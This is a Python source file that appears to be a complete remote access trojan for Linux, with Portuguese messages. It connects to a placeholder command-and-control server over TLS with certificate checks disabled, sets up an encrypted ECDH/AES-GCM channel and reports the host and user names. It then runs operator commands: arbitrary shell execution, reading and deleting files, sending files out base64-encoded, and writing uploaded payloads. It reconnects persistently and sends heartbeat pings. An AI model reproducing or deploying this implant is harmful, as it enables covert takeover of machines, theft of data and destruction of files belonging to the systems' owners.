import base64
import json
import os
import platform
import socket
import struct
import subprocess
import sys
import threading
import time
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization

C2_HOST = "IP_do_Server"
C2_PORT = 443

def connect_direct(host, port):
    import ssl
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    tls_conn = context.wrap_socket(sock, server_hostname=host)
    tls_conn.connect((host, int(port)))
    return tls_conn

def encrypt_aes(key, plaintext):
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext

def decrypt_aes(key, ciphertext):
    aesgcm = AESGCM(key)
    if len(ciphertext) < 12:
        raise Exception("ciphertext curto")
    nonce = ciphertext[:12]
    cipherdata = ciphertext[12:]
    return aesgcm.decrypt(nonce, cipherdata, None)

def execute_linux_command(cmd_str, current_dir):
    parts = cmd_str.strip().split()
    if not parts:
        return "", current_dir
    action = parts[0].lower()

    if action == "pwd":
        return current_dir, current_dir
    elif action == "cd":
        if len(parts) < 2:
            return current_dir, current_dir
        target = parts[1]
        if not os.path.isabs(target):
            target = os.path.join(current_dir, target)
        if os.path.exists(target) and os.path.isdir(target):
            os.chdir(target)
            return target, target
        return f"Diretório não encontrado: {target}", current_dir
    elif action in ["ls", "dir"]:
        try:
            files = os.listdir(current_dir)
            sb = f"\nDirectory of {current_dir}:\n\n"
            for f in files:
                f_path = os.path.join(current_dir, f)
                st = os.stat(f_path)
                mode = oct(st.st_mode)[-3:]
                size = st.st_size
                sb += f"{mode}  {size:10d}  {f}\n"
            return sb, current_dir
        except Exception as e:
            return str(e), current_dir
    elif action == "cat":
        if len(parts) < 2:
            return "Uso: cat <arq>", current_dir
        p = parts[1]
        if not os.path.isabs(p):
            p = os.path.join(current_dir, p)
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                return f.read(), current_dir
        except Exception as e:
            return str(e), current_dir
    elif action == "rm":
        if len(parts) < 2:
            return "Uso: rm <arq>", current_dir
        p = parts[1]
        if not os.path.isabs(p):
            p = os.path.join(current_dir, p)
        try:
            os.remove(p)
            return "Removido.", current_dir
        except Exception as e:
            return str(e), current_dir
    elif action == "hostname":
        return f"[+] Hostname: {platform.node()}", current_dir
    elif action == "whoami":
        try:
            out = subprocess.check_output("whoami", shell=True, text=True).strip()
            return out, current_dir
        except Exception as e:
            return str(e), current_dir
    elif action == "id":
        try:
            out = subprocess.check_output("id", shell=True, text=True).strip()
            return out, current_dir
        except Exception as e:
            return str(e), current_dir
    elif action in ["exec", "run"]:
        if len(parts) < 2:
            return "Uso: exec <cmd>", current_dir
        full_cmd = cmd_str.strip()[len(parts[0]):].strip()
        try:
            res = subprocess.run(full_cmd, shell=True, cwd=current_dir, capture_output=True, text=True)
            out = res.stdout + res.stderr
            if res.returncode != 0:
                return f"[-] Erro: {out}", current_dir
            return out, current_dir
        except Exception as e:
            return f"[-] Erro: {e}", current_dir
    elif action == "download":
        if len(parts) < 2:
            return "Uso: download <arq>", current_dir
        p = parts[1]
        try:
            with open(p, "rb") as f:
                b = f.read()
            return f"[FILE_DOWNLOAD_DATA]|{os.path.basename(p)}|{base64.b64encode(b).decode()}", current_dir
        except Exception as e:
            return str(e), current_dir
    else:
        try:
            res = subprocess.run(cmd_str, shell=True, cwd=current_dir, capture_output=True, text=True)
            out = res.stdout + res.stderr
            if res.returncode != 0:
                return f"[-] Comando não reconhecido ou erro:\n{out}", current_dir
            return out, current_dir
        except Exception as e:
            return f"[-] Comando não reconhecido ou erro: {e}", current_dir

def send_packet(conn, key, data):
    try:
        cipher_data = encrypt_aes(key, data)
        l = len(cipher_data)
        header = struct.pack(">I", l)
        conn.sendall(header + cipher_data)
    except:
        pass

def main():
    hostname = platform.node()
    current_user = os.getenv("USER") or os.getenv("USERNAME") or "root"
    info_map = {
        "hostname": hostname,
        "username": current_user,
        "os": "Linux"
    }
    info_bytes = json.dumps(info_map).encode()
    current_dir = os.getcwd()

    while True:
        try:
            conn = connect_direct(C2_HOST, C2_PORT)
        except:
            time.sleep(10)
            continue

        try:
            priv_key = ec.generate_private_key(ec.SECP256R1())
            pub_key = priv_key.public_key()
            pub_key_bytes = pub_key.public_bytes(
                encoding=serialization.Encoding.X962,
                format=serialization.PublicFormat.UncompressedPoint
            )
            conn.sendall(pub_key_bytes)

            srv_pub_bytes = conn.recv(1024)
            if not srv_pub_bytes:
                conn.close()
                continue
                
            srv_pub_key = serialization.load_der_public_key(
                b'\x30\x59\x30\x13\x06\x07\x2a\x86\x48\xce\x3d\x02\x01\x06\x08\x2a\x86\x48\xce\x3d\x03\x01\x07\x03\x42\x00' + srv_pub_bytes
            )
            
            shared_key = priv_key.exchange(ec.ECDH(), srv_pub_key)
            aes_key = shared_key
            if len(aes_key) > 32:
                aes_key = aes_key[-32:]
            elif len(aes_key) < 32:
                aes_key = aes_key.rjust(32, b'\x00')

            enc_meta = encrypt_aes(aes_key, info_bytes)
            conn.sendall(struct.pack(">I", len(enc_meta)) + enc_meta)

            def ping_loop(c, k):
                while True:
                    time.sleep(15)
                    send_packet(c, k, b"[ping]")

            t = threading.Thread(target=ping_loop, args=(conn, aes_key), daemon=True)
            t.start()

            while True:
                len_header = conn.recv(4)
                if not len_header or len(len_header) < 4:
                    break
                packet_len = struct.unpack(">I", len_header)[0]
                
                packet_bytes = b""
                while len(packet_bytes) < packet_len:
                    chunk = conn.recv(packet_len - len(packet_bytes))
                    if not chunk:
                        break
                    packet_bytes += chunk
                
                if len(packet_bytes) < packet_len:
                    break

                try:
                    plain_cmd = decrypt_aes(aes_key, packet_bytes)
                except:
                    continue

                cmd_str = plain_cmd.decode(errors="ignore").strip()
                if cmd_str == "[ping]":
                    continue
                if cmd_str == "[kill]":
                    conn.close()
                    sys.exit(0)

                if cmd_str.startswith("upload_payload "):
                    try:
                        args = json.loads(cmd_str[len("upload_payload "):])
                        remote_path = args["path"]
                        file_data = base64.b64decode(args["data"])
                        os.makedirs(os.path.dirname(remote_path) if os.path.dirname(remote_path) else '.', exist_ok=True)
                        with open(remote_path, "wb") as f:
                            f.write(file_data)
                        send_packet(conn, aes_key, b"[+] Upload concluido.")
                    except:
                        pass
                    continue

                output, new_dir = execute_linux_command(cmd_str, current_dir)
                current_dir = new_dir

                if output.startswith("[FILE_DOWNLOAD_DATA]|"):
                    parts = output.split("|", 2)
                    try:
                        file_bytes = base64.b64decode(parts[2])
                        with open(parts[1], "wb") as fw:
                            fw.write(file_bytes)
                    except:
                        pass
                    output = "[+] Arquivo baixado com sucesso."

                if not output:
                    output = "[comando executado sem saida]"
                
                send_packet(conn, aes_key, output.encode())

        except Exception:
            pass
        finally:
            try:
                conn.close()
            except:
                pass
            time.sleep(10)

main()
